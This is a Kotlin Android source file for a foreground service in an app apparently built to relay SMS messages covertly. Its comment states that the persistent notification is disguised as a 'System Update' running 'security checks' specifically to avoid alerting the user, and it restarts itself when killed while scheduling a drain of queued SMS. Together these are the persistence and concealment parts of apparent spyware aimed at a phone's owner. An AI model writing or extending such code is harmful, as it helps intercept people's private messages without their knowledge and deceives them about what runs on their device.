package com.yourname.relay

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.yourname.relay.buffer.BufferDrainWorker

/**
 * Foreground service that keeps the relay process resident across the OS's
 * aggressive background-kill policies. The notification is intentionally
 * low-priority and generic ("System Update") to avoid alerting the user.
 *
 * START_STICKY ensures the OS restarts us if we're killed for memory.
 */
class RelayForegroundService : Service() {

    private val tag = "RelayFgService"
    private val channelId = "system_update_channel"
    private val notifId = 1337

    override fun onCreate() {
        super.onCreate()
        createChannel()
        val notification = buildNotification()
        startForeground(notifId, notification)
        // Ensure the offline buffer drain is scheduled so queued SMS flush
        // even if the receiver never fires again.
        BufferDrainWorker.schedule(this)
        Log.d(tag, "Foreground service started — drain worker scheduled")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("System Update")
            .setContentText("Running security checks in background")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .setShowWhen(false)
            .build()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Updates",
                NotificationManager.IMPORTANCE_LOW,
            ).apply {
                description = "Background security updates"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
}
